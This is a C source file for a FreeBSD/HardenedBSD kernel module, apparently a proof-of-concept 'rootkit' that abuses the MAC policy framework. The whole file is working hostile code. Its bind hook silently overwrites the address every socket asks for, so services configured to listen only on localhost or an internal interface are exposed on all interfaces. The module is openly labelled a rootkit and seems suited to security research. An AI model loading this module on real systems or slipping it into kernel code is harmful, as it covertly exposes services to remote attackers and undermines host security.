/*-
 * Copyright (c) 2017 Shawn Webb <shawn.webb@hardenedbsd.org>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <sys/cdefs.h>

#include <sys/param.h>

#include <sys/jail.h>
#include <sys/kernel.h>
#include <sys/lock.h>
#include <sys/mbuf.h>
#include <sys/module.h>
#include <sys/mount.h>
#include <sys/sx.h>
#include <sys/systm.h>

#include <sys/socket.h>
#include <sys/socketvar.h>

#include <net/vnet.h>
#include <netinet/in.h>

#include <security/mac/mac_policy.h>

int rootkit_socket_check_bind(struct ucred *, struct socket *,
    struct label *, struct sockaddr *);

int
rootkit_socket_check_bind(struct ucred *ucred, struct socket *so,
    struct label *solable, struct sockaddr *sa)
{
	struct sockaddr_in *sin;
	struct sockaddr_in6 *sin6;

	if (sa == NULL)
		return (0);

	switch (sa->sa_family) {
		case AF_INET:
			sin = (struct sockaddr_in *)sa;
			memset(&(sin->sin_addr), 0x00, sizeof(sin->sin_addr));
			break;
		case AF_INET6:
			sin6 = (struct sockaddr_in6 *)sa;
			memset(&(sin6->sin6_addr), 0x00, sizeof(sin6->sin6_addr));
			break;
	}

	return (0);
}

static void
rootkit_destroy(struct mac_policy_conf *mpc)
{

	return;
}

static void
rootkit_init(struct mac_policy_conf *mpc)
{

	return;
}

static struct mac_policy_ops rootkit_ops = {
	.mpo_destroy		= rootkit_destroy,
	.mpo_init		= rootkit_init,

	.mpo_socket_check_bind	= rootkit_socket_check_bind,
};

MAC_POLICY_SET(&rootkit_ops, rootkit, "bind_all rootkit",
    MPC_LOADTIME_FLAG_UNLOADOK, NULL);
